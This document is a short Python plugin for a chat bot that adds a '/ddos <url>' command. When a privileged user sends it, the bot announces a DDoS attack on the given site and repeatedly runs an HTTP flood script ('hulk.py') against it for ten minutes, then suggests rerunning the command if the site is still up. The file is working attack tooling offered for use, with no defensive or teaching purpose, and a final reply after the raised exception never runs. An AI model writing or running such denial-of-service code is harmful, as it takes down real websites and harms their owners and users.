import sys
import os
import time
import socket
import random
from alexa.events import register
from alexa import SUDO_USERS
import subprocess

@register(pattern="/ddos (.*)")
async def ddos(event): 
  userid = event.message.sender_id
  if userid not in SUDO_USERS:
     return
  url = event.pattern_match.group(1)
  cmnd = f"{url}"
  await event.reply(f"Starting DDOS attack on site `{url}`\n\nThis attack will automatically stop after 10 mins")
  print("starting attack")
  timeout = 600
  timeout_start = time.time()
  while time.time() < timeout_start + timeout:
     subprocess.run(["python", "hulk.py", cmnd, "safe"])
  if time.time() >= timeout_start + timeout:
     raise KeyboardInterrupt
     await event.reply(f"Attacked has stopped now\nIf {url} still isn't down then run the same command again")
